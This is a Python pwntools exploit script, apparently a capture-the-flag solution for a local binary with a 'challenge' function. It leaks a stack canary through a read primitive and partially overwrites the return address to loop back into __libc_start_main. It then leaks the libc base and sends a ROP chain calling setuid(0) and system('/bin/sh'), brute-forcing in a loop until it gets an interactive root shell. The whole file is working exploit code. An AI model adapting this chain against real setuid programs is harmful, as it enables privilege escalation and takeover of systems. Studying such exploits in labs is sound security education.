#!/bin/python

from pwn import * 
import sys
import time

context.arch = 'amd64'
context.log_level  = 'debug'

FUNC_NAME="challenge"
BUFFER_LEN= 0x30-8

elf = None
rop = None
libc = None


def get_payload(args, proc: process):
    global elf, rop, libc
    elf = proc.elf 
    rop = ROP(elf)

    if libc is None:
        libc = elf.libc
#    import IPython; IPython.embed()


    # First stage    
    proc.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
    leak_addr = int(proc.recvline(drop=True)[:-1], 16)

    proc.sendline(hex(leak_addr + BUFFER_LEN))
    proc.recvuntil(b"[LEAK]")
    canary = int(proc.recvline(drop=True)[-16:], 16)
    print("[+] Canary: " + hex(canary))

    # Repeat execution
    libc_main_off = libc.symbols['__libc_start_main']
    proc.send(flat([
            b'X' * BUFFER_LEN,
            canary,
            b'Y' * 8, #rbp
            p16(libc_main_off & 0x0FFFF),
    ]))
    
    
    # Second stage
    try:
        proc.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
        leak_addr = int(proc.recvline(drop=True)[:-1], 16)

        proc.recvuntil("Address in hex to read from:\n")
        proc.sendline(hex(leak_addr + BUFFER_LEN + 16)) # addr of saved_rip
        leaked_rip = int(proc.recvline(drop=True)[-16:], 16)
        libc.address = (leaked_rip - libc_main_off)  & 0xFFFFFFFFF000
        print("[+] Libc base address: " + hex(libc.address))

        libc_rop = ROP(libc)
        sh_str = next(libc.search(b'/bin/sh'))
        libc_rop.setuid(0)
#        libc_rop.raw(libc_rop.ret)
        libc_rop.system(sh_str)

        print(f"[+] {libc_rop.dump()}")
        return flat([
            b'Z' * BUFFER_LEN,
            canary,
            b'T' * 8,
            libc_rop.chain()
        ])
        
    except EOFError as _:
        return b'\x00'



def main():
    count = 1
    while True:
        if not count % 500:
            print("...")
            time.sleep(1)
        count += 1

        proc = process(sys.argv[1])
        payload = get_payload(None, proc)
        if proc.poll() is None:
            proc.send(payload)

        if proc.poll() is None:
            proc.interactive()
#            time.sleep(0.1)



if __name__ == '__main__':
    main()
